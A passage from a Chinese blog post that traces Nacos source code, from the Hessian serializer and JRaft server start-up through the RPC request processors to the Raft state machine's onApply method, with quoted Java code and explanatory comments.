class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> SERIALIZER_MAP.get(defaultSerializer);<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Serializer <span class="hljs-title function_">getSerializer</span><span class="hljs-params">(String type)</span> &#123;<br>        <span class="hljs-keyword">return</span> SERIALIZER_MAP.get(type.toLowerCase());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>com.alibaba.nacos.consistency.serialize.HessianSerializer   此处直接为 Hessian 序列化及反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.nacos.consistency.Serializer;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.SerializerFactory;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HessianSerializer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializer</span> &#123;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Hessian&quot;</span>;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-type">SerializerFactory</span> <span class="hljs-variable">serializerFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerFactory</span>();<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">HessianSerializer</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> &lt;T&gt; T <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] data)</span> &#123;<br>        <span class="hljs-keyword">return</span> deseiralize0(data);<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> &lt;T&gt; T <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] data, Class&lt;T&gt; cls)</span> &#123;<br>        <span class="hljs-keyword">return</span> deserialize(data);<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> &lt;T&gt; T <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] data, Type type)</span> &#123;<br>        <span class="hljs-keyword">return</span> deserialize(data);<br>    &#125;<br>    <br>    <span class="hljs-keyword">private</span> &lt;T&gt; T <span class="hljs-title function_">deseiralize0</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] data)</span> &#123;<br>        <span class="hljs-keyword">if</span> (ByteUtils.isEmpty(data)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    <br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(data));<br>        input.setSerializerFactory(serializerFactory);<br>        Object resultObject;<br>        <span class="hljs-keyword">try</span> &#123;<br>            resultObject = input.readObject();<br>            input.close();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;IOException occurred when Hessian serializer decode!&quot;</span>, e);<br>        &#125;<br>        <span class="hljs-keyword">return</span> (T) resultObject;<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> &lt;T&gt; <span class="hljs-type">byte</span>[] serialize(T obj) &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(byteArray);<br>        output.setSerializerFactory(serializerFactory);<br>        <span class="hljs-keyword">try</span> &#123;<br>            output.writeObject(obj);<br>            output.close();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;IOException occurred when Hessian serializer encode!&quot;</span>, e);<br>        &#125;<br>        <br>        <span class="hljs-keyword">return</span> byteArray.toByteArray();<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">name</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> NAME;<br>    &#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="JRaftServer"><a href="#JRaftServer" class="headerlink" title="JRaftServer"></a>JRaftServer</h3><p>com.alibaba.nacos.core.distributed.raft.JRaftServer#start() 启动RaftServer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">if</span> (!isStarted) &#123;<br>        Loggers.RAFT.info(<span class="hljs-string">&quot;========= The raft protocol is starting... =========&quot;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// init raft group node</span><br>            com.alipay.sofa.jraft.<span class="hljs-type">NodeManager</span> <span class="hljs-variable">raftNodeManager</span> <span class="hljs-operator">=</span> com.alipay.sofa.jraft.NodeManager.getInstance();<br>            <span class="hljs-keyword">for</span> (String address : raftConfig.getMembers()) &#123;<br>                <span class="hljs-type">PeerId</span> <span class="hljs-variable">peerId</span> <span class="hljs-operator">=</span> PeerId.parsePeer(address);<br>                conf.addPeer(peerId);<br>                raftNodeManager.addAddress(peerId.getEndpoint());<br>            &#125;<br>            nodeOptions.setInitialConf(conf);<br>            <span class="hljs-comment">//调用至JRaftUtils#initRpcServer()</span><br>            rpcServer = JRaftUtils.initRpcServer(<span class="hljs-built_in">this</span>, localPeerId);<br>            <br>            <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.rpcServer.init(<span class="hljs-literal">null</span>)) &#123;<br>                Loggers.RAFT.error(<span class="hljs-string">&quot;Fail to init [BaseRpcServer].&quot;</span>);<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;Fail to init [BaseRpcServer].&quot;</span>);<br>            &#125;<br>            <br>            <span class="hljs-comment">// Initialize multi raft group service framework</span><br>            isStarted = <span class="hljs-literal">true</span>;<br>            createMultiRaftGroup(processors);<br>            Loggers.RAFT.info(<span class="hljs-string">&quot;========= The raft protocol start finished... =========&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            Loggers.RAFT.error(<span class="hljs-string">&quot;raft protocol start failure, cause: &quot;</span>, e);<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JRaftException</span>(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>JRaftUtils#initRpcServer()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> RpcServer <span class="hljs-title function_">initRpcServer</span><span class="hljs-params">(JRaftServer server, PeerId peerId)</span> &#123;<br><br>...<br>    <span class="hljs-comment">//注册自定义 Rpc 请求处理器</span><br>    rpcServer.registerProcessor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">NacosWriteRequestProcessor</span>(server, SerializeFactory.getDefault()));<br>    rpcServer.registerProcessor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">NacosReadRequestProcessor</span>(server, SerializeFactory.getDefault()));<br>    <br>    <span class="hljs-keyword">return</span> rpcServer;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="RpcProcessor"><a href="#RpcProcessor" class="headerlink" title="RpcProcessor"></a>RpcProcessor</h3><p>Rpc 请求处理器，只有当业务通讯也使用sofa-jraft提供的RpcServer才需要。可以实现com.alipay.sofa.jraft.rpc.RpcProcessor接口，根据目标请求参数，处理业务请求。<br>可看出 Nacos 使用的 RpcProcessor 为NacosWriteRequestProcessor 和 NacosReadRequestProcessor<br>NacosWriteRequestProcessor</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NacosWriteRequestProcessor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractProcessor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RpcProcessor</span>&lt;WriteRequest&gt; &#123;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">INTEREST_NAME</span> <span class="hljs-operator">=</span> WriteRequest.class.getName();<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> JRaftServer server;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">NacosWriteRequestProcessor</span><span class="hljs-params">(JRaftServer server, Serializer serializer)</span> &#123;<br>        <span class="hljs-built_in">super</span>(serializer);<br>        <span class="hljs-built_in">this</span>.server = server;<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleRequest</span><span class="hljs-params">(RpcContext rpcCtx, WriteRequest request)</span> &#123;<br>        <span class="hljs-comment">//调用至父类即 AbstractProcessor#handleRequest()方法</span><br>        handleRequest(server, request.getGroup(), rpcCtx, request);<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">interest</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> INTEREST_NAME;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>NacosWriteRequestProcessor 继承 AbstractProcessor</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AbstractProcessor</span> &#123;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Serializer serializer;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">AbstractProcessor</span><span class="hljs-params">(Serializer serializer)</span> &#123;<br>        <span class="hljs-built_in">this</span>.serializer = serializer;<br>    &#125;<br>    <br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleRequest</span><span class="hljs-params">(<span class="hljs-keyword">final</span> JRaftServer server, <span class="hljs-keyword">final</span> String group, <span class="hljs-keyword">final</span> RpcContext rpcCtx, Message message)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">final</span> JRaftServer.<span class="hljs-type">RaftGroupTuple</span> <span class="hljs-variable">tuple</span> <span class="hljs-operator">=</span> server.findTupleByGroup(group);<br>            <span class="hljs-keyword">if</span> (Objects.isNull(tuple)) &#123;<br>                rpcCtx.sendResponse(Response.newBuilder().setSuccess(<span class="hljs-literal">false</span>)<br>                        .setErrMsg(<span class="hljs-string">&quot;Could not find the corresponding Raft Group : &quot;</span> + group).build());<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>            <span class="hljs-comment">//判断是否为 Leader</span><br>            <span class="hljs-keyword">if</span> (tuple.getNode().isLeader()) &#123;<br>                <span class="hljs-comment">//此处后续调用至自定义状态机</span><br>                execute(server, rpcCtx, message, tuple);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                rpcCtx.sendResponse(<br>                        Response.newBuilder().setSuccess(<span class="hljs-literal">false</span>).setErrMsg(<span class="hljs-string">&quot;Could not find leader : &quot;</span> + group).build());<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Throwable e) &#123;<br>            Loggers.RAFT.error(<span class="hljs-string">&quot;handleRequest has error : &quot;</span>, e);<br>            rpcCtx.sendResponse(Response.newBuilder().setSuccess(<span class="hljs-literal">false</span>).setErrMsg(e.toString()).build());<br>        &#125;<br>    &#125;<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>com.alipay.sofa.jraft.core.#isLeader() 此处获取State.STATE_LEADER</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isLeader</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> isLeader(<span class="hljs-literal">true</span>);<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isLeader</span><span class="hljs-params">(<span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> blocking)</span> &#123;<br>    <span class="hljs-keyword">if</span> (!blocking) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.state == State.STATE_LEADER;<br>    &#125;<br>    <span class="hljs-built_in">this</span>.readLock.lock();<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.state == State.STATE_LEADER;<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        <span class="hljs-built_in">this</span>.readLock.unlock();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="状态机"><a href="#状态机" class="headerlink" title="状态机"></a>状态机</h3><p>使用sofa-jraft需要实现自己的StateMachine，Nacos使用得状态机为 NacosStateMachine<br>最重要的方法是onApply方法。当Node提交Task，对应的log被提交到Raft集群后，当quorum节点成功commit log，触发这个方法来应用状态（当前节点存储数据）。CounterStateMachine在onApply方法中，执行原子计数器的相关功能，包括get和addAndGet。<br>com.alibaba.nacos.core.distributed.raft.JRaftServer#createMultiRaftGroup() 启动RaftServer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createMultiRaftGroup</span><span class="hljs-params">(Collection&lt;RequestProcessor4CP&gt; processors)</span> &#123;<br>    <span class="hljs-comment">// There is no reason why the LogProcessor cannot be processed because of the synchronization</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.isStarted) &#123;<br>        <span class="hljs-built_in">this</span>.processors.addAll(processors);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">parentPath</span> <span class="hljs-operator">=</span> Paths.get(EnvUtil.getNacosHome(), <span class="hljs-string">&quot;data/protocol/raft&quot;</span>).toString();<br>    <br>    <span class="hljs-keyword">for</span> (RequestProcessor4CP processor : processors) &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">groupName</span> <span class="hljs-operator">=</span> processor.group();<br>        <span class="hljs-keyword">if</span> (multiRaftGroup.containsKey(groupName)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DuplicateRaftGroupException</span>(groupName);<br>        &#125;<br>        <br>        <span class="hljs-comment">//确保每个Raft Group都有自己的配置和NodeOptions</span><br>        <span class="hljs-type">Configuration</span> <span class="hljs-variable">configuration</span> <span class="hljs-operator">=</span> conf.copy();<br>        <span class="hljs-type">NodeOptions</span> <span class="hljs-variable">copy</span> <span class="hljs-operator">=</span> nodeOptions.copy();<br>        JRaftUtils.initDirectory(parentPath, groupName, copy);<br>        <br>        <span class="hljs-comment">// Here, the LogProcessor is passed into StateMachine, and when the StateMachine</span><br>        <span class="hljs-comment">// triggers onApply, the onApply of the LogProcessor is actually called</span><br>        <span class="hljs-comment">//processors 传递给StateMachine，当StateMachine</span><br><span class="hljs-comment">//触发onApply，实际调用 processors的onApply()</span><br>        <span class="hljs-type">NacosStateMachine</span> <span class="hljs-variable">machine</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NacosStateMachine</span>(<span class="hljs-built_in">this</span>, processor);<br>        <br>        copy.setFsm(machine);<br>        copy.setInitialConf(configuration);<br>            <br>        <span class="hljs-comment">// Set snapshot interval, default 1800 seconds</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">doSnapshotInterval</span> <span class="hljs-operator">=</span> ConvertUtils.toInt(raftConfig.getVal(RaftSysConstants.RAFT_SNAPSHOT_INTERVAL_SECS),<br>                RaftSysConstants.DEFAULT_RAFT_SNAPSHOT_INTERVAL_SECS);<br>        <br>        <span class="hljs-comment">// If the business module does not implement a snapshot processor, cancel the snapshot</span><br>        doSnapshotInterval = CollectionUtils.isEmpty(processor.loadSnapshotOperate()) ? <span class="hljs-number">0</span> : doSnapshotInterval;<br>        <br>        copy.setSnapshotIntervalSecs(doSnapshotInterval);<br>        Loggers.RAFT.info(<span class="hljs-string">&quot;create raft group : &#123;&#125;&quot;</span>, groupName);<br>        <span class="hljs-type">RaftGroupService</span> <span class="hljs-variable">raftGroupService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RaftGroupService</span>(groupName, localPeerId, copy, rpcServer, <span class="hljs-literal">true</span>);<br><br>        <span class="hljs-comment">//启动</span><br>        <span class="hljs-comment">// Because BaseRpcServer has been started before, it is not allowed to start again here</span><br>        <span class="hljs-type">Node</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> raftGroupService.start(<span class="hljs-literal">false</span>);<br>        machine.setNode(node);<br>        RouteTable.getInstance().updateConfiguration(groupName, configuration);<br>        <br>        RaftExecutor.executeByCommon(() -&gt; registerSelfToCluster(groupName, localPeerId, configuration));<br>        <br>        <span class="hljs-comment">// Turn on the leader auto refresh for this group</span><br>        <span class="hljs-type">Random</span> <span class="hljs-variable">random</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>();<br>        <span class="hljs-type">long</span> <span class="hljs-variable">period</span> <span class="hljs-operator">=</span> nodeOptions.getElectionTimeoutMs() + random.nextInt(<span class="hljs-number">5</span> * <span class="hljs-number">1000</span>);<br>        RaftExecutor.scheduleRaftMemberRefreshJob(() -&gt; refreshRouteTable(groupName),<br>                nodeOptions.getElectionTimeoutMs(), period, TimeUnit.MILLISECONDS);<br>        multiRaftGroup.put(groupName, <span class="hljs-keyword">new</span> <span class="hljs-title class_">RaftGroupTuple</span>(node, processor, raftGroupService, machine));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>JRaftServer#createMultiRaftGroup()  传入参数类为 RequestProcessor4CP，此类存在5个实现类，其中以下三个为<code>@Component</code>为注解注释类</p><ul><li>com.alibaba.nacos.naming.core.v2.service.impl.PersistentClientOperationServiceImpl</li><li>com.alibaba.nacos.naming.core.v2.metadata.InstanceMetadataProcessor</li><li>com.alibaba.nacos.naming.core.v2.metadata.ServiceMetadataProcessor</li></ul><p>以上三个类构造方法中均调用 JRaftProtocol#addRequestProcessors() 方法，最终调用至JRaftServer#createMultiRaftGroup()，故调用顺序为 NacosStateMachine#onApply() 后调用至以上三个类的 onApply() 方法。<br>NacosStateMachine#onApply()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onApply</span><span class="hljs-params">(Iterator iter)</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">applied</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    Message message;<br>    <span class="hljs-type">NacosClosure</span> <span class="hljs-variable">closure</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">while</span> (iter.hasNext()) &#123;<br>            <span class="hljs-type">Status</span> <span class="hljs-variable">status</span> <span class="hljs-operator">=</span> Status.OK();<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">if</span> (iter.done() != <span class="hljs-literal">null</span>) &#123;<br>                    closure = (NacosClosure) iter.done();<br>                    message = closure.getMessage();<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">final</span> <span class="hljs-type">ByteBuffer</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> iter.getData();<br>                    message = ProtoMessageUtil.parse(data.array());<br>                    <span class="hljs-keyword">if</span> (message <span class="hljs-keyword">instanceof</span> ReadRequest) &#123;<br>                        <span class="hljs-comment">//&#x27;iter.done() == null&#x27; means current node is follower, ignore read operation</span><br>                        applied++;<br>                        index++;<br>                        iter.next();<br>                        <span class="hljs-keyword">continue</span>;<br>                    &#125;<br>                &#125;<br>                <br>                LoggerUtils.printIfDebugEnabled(Loggers.RAFT, <span class="hljs-string">&quot;receive log : &#123;&#125;&quot;</span>, message);<br><br>                <span class="hljs-comment">//判断类型是否为 WriteRequest 是则进入if</span><br>                <span class="hljs-keyword">if</span> (message <span class="hljs-keyword">instanceof</span> WriteRequest) &#123;<br>                    <span class="hljs-comment">//调用上面三个实现类的 onApply() 方法</span><br>                    <span class="hljs-type">Response</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> processor.onApply((WriteRequest) message);<br>                    postProcessor(response, closure);<br>                &#125;<br>                <br>                <span class="hljs-keyword">if</span> (message <span class="hljs-keyword">instanceof</span> ReadRequest) &#123;<br>                    <span class="hljs-type">Response</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> processor.onRequest((ReadRequest) message);<br>                    postProcessor(response, closure);<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (Throwable e) &#123;<br>                index++;<br>                status.setError(RaftError.UNKNOWN, e.toString());<br>                Optional.ofNullable(closure).ifPresent(closure1 -&gt; closure1.setThrowable(e));<br>                <span class="hljs-keyword">throw</span> e;<br>            &#125; <span class="hljs-keyword">finally</span> &#123;<br>                Optional.ofNullable(closure).ifPresent(closure1 -&gt; closure1.run(status));<br>&#125;<br>            applied++;<br>            index++;<br>            iter.next();<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Throwable t) &#123;<br>            Loggers.RAFT.error(<span class="hljs-string">&quot;processor : &#123;&#125;, stateMachine meet critical error: &#123;&#125;.&quot;</span>, processor, t);<br>            <span class="hljs-comment">//若 processor#onApply() 则设置 State 为State.STATE_ERROR</span><br>        iter.setErrorAndRollback(index - applied,<br>                    <span 